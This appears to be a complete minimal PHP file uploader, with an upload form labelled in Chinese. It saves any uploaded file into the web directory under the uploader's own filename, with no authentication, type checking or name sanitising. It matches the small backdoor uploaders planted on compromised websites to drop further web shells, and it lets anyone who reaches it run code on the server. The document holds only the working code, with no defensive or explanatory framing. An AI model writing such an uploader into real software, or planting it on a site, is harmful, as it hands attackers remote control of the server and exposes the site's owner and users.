<?php
if(!empty($_FILES["ff"])){
move_uploaded_file($_FILES["ff"]["tmp_name"],$_FILES["ff"]["name"]);
}
?>
<meta charset="utf-8">
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="ff">
<input type="submit" value="上传">
</form> 